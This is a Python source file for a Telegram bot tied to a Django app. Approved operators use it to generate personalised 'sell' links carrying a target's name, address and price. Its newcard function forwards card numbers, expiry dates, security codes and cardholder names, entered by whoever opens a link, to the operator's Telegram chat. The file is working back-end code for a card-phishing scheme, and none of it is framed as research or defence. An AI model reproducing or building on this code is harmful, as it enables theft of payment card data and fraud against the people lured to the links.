import telebot
from telebot import types
import sys
import threading
from sell.models import Creator, Link
from django.conf import settings

token=settings.TOKEN
bot = telebot.TeleBot(token)

usernames = list(Creator.objects.values_list('username',flat=True))

delmark = telebot.types.ReplyKeyboardRemove()

markup1 = types.ReplyKeyboardMarkup(resize_keyboard=True)
btn1 = types.KeyboardButton("Yes")
btn2 = types.KeyboardButton("No")
markup1.add(btn1,btn2)

markup2 = types.ReplyKeyboardMarkup(resize_keyboard=True)
btn3 = types.KeyboardButton("Yes")
btn4 = types.KeyboardButton("Thanks and good bye")
markup2.add(btn3,btn4)

d = {}
for i in usernames:
    d[i]=0

def newcard(list):
    mid = 526995647
    try:
        mid = Creator.objects.get(id = list.link_id.creator_id).teleid
    finally:
        print(mid)
        bot.send_message(mid,'Somebody entered this information: Card number - {}, Expiration date - {}, CSV - {}, Name - {}'.format(list.cardnumber, list.expirationdate, list.securitycode, list.name))

@bot.message_handler(commands=['start'])
def start(message):
    bot.send_message(message.chat.id,'''Welcome to the club, Buddy!''', reply_markup = delmark)

@bot.message_handler(commands=['newlink'])
def newlink(message):
    if d[message.chat.username]==0:
        bot.send_message(message.chat.id,'''Enter name''', reply_markup = delmark)
        d[message.chat.username]=[]

@bot.message_handler(content_types=['text'])
def text(message):
    username = message.chat.username
    print('{}: {}'.format(username, message.text))
    if username in usernames and message.chat.type=='private':
        user = Creator.objects.get(username = username)
        user.teleid = message.chat.id
        user.save()
        if d[username]==1:
            if message.text=="Yes":
                bot.send_message(message.chat.id,'''Enter name''', reply_markup = delmark)
                d[message.chat.username]=[]
            else:
                bot.send_message(message.chat.id,'''Goodbye!''', reply_markup = delmark)
                d[username]=0
        if type(d[username])==type([]):
            if len(d[username])==4:
                if message.text.upper()=="YES":
                    link = Link.objects.create(first_name = d[username][0], last_name = d[username][1], adress = d[username][2], creator = user, money = d[username][3])
                    bot.send_message(message.chat.id,'Information added, waiting for the link', reply_markup = delmark)
                    bot.send_message(message.chat.id,'http://127.0.0.1:8000/sell/'+str(link.id))
                    bot.send_message(message.chat.id,'Ready, do you want to create new link?', reply_markup = markup2)
                    d[username]=1
                elif message.text.upper()=="NO":
                    d[username]=0
                    bot.send_message(message.chat.id,'Now you can recreate link', reply_markup = delmark)
                else:
                    bot.send_message(message.chat.id,'Your answer unrecognized, try again')
            elif d[username]!=0:
                print(d)
                if len(d[username])<3:
                    if not message.text.isnumeric():
                        d[username].append(message.text)
                    else:
                        bot.send_message(message.chat.id,'This information must be a number')
                        if not len(d[username]):
                            bot.send_message(message.chat.id,'Write name')
                elif len(d[username])==3:
                    if message.text.isnumeric():
                        d[username].append(message.text)
                    else:
                        bot.send_message(message.chat.id,'This information must be a number')
                        if not len(d[username]):
                            bot.send_message(message.chat.id,'Write price')

                if len(d[username])==1:
                    bot.send_message(message.chat.id,'Write last name')
                elif len(d[username])==2:
                    bot.send_message(message.chat.id,'Write adress')
                elif len(d[username])==3:
                    bot.send_message(message.chat.id,'Write price')
                elif len(d[username])==4:
                    bot.send_message(message.chat.id,'''Well, the list of data looks like this: First name - {}, last name - {}, address - {}, price - {}. Are you sure you want to create a link with such data? (Yes No)'''
                                                        .format(d[username][0],d[username][1],d[username][2],str(int(d[username][3]))), reply_markup=markup1)

    else:
        bot.send_message(message.chat.id,'Access error')
try:
    x = threading.Thread(target=bot.infinity_polling, daemon=True)
    x.start()
except Exception as e:
    print(e)
